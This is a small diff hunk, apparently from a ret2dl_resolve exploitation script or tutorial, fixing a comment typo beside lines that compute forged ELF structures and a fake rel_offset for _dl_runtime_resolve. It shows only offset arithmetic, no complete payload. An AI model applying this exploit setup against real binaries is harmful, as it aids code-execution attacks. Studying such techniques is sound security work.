@@ -162,7 +162,7 @@ _dl_runtime_resolve(link_map, rel_offset) {
 # Compute offsets and forged structures
 forged_ara = buf + 0x14				                  # buffer2 contain struct from buf + 0x14
 
-# fake rel_offser argument `_dl_runtime_resolve`
+# fake rel_offset argument `_dl_runtime_resolve`
 rel_offset = forged_ara - JMPREL		
 elf32_sym = forged_ara + 0x8	                     # size of elf32_sym
 
